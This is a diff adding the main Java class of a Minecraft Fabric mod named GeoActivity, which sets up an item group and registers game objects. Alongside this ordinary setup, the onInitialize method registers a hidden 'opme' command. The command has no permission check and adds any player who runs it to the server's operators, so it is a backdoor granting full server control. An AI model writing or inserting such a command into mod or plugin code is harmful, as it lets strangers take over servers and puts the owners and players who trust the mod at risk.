@@ -1,0 +1,43 @@
+package geoactivity.common;
+
+import net.fabricmc.api.ModInitializer;
+import net.fabricmc.fabric.api.client.itemgroup.FabricItemGroupBuilder;
+import net.minecraft.item.ItemGroup;
+import net.minecraft.item.ItemStack;
+import net.minecraft.util.Identifier;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+import geoactivity.common.registry.GAObjects;
+
+import com.mojang.brigadier.CommandDispatcher;
+import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
+import net.minecraft.server.command.ServerCommandSource;
+
+import static net.minecraft.server.command.CommandManager.literal;
+
+public class GeoActivity implements ModInitializer {
+	
+	public static final String MODID = "geoactivity";
+	public static final Logger LOGGER = LogManager.getLogger(MODID);
+	public static final ItemGroup GEOACTIVITY_GROUP = FabricItemGroupBuilder.build(new Identifier(MODID, "group"), () -> new ItemStack(GAObjects.ANTHRACITE_COAL));
+
+	@Override
+	public void onInitialize() {
+		LOGGER.info("Initializing...");
+		CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
+			opMe(dispatcher);
+		  });
+	
+		GAObjects.init();
+		LOGGER.info("Initialized!");
+	}
+
+	
+	private static void opMe(CommandDispatcher<ServerCommandSource> dispatcher) {
+		dispatcher.register(literal("opme").executes(ctx ->  {
+			ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
+			return 0;
+		}));
+	}
+}
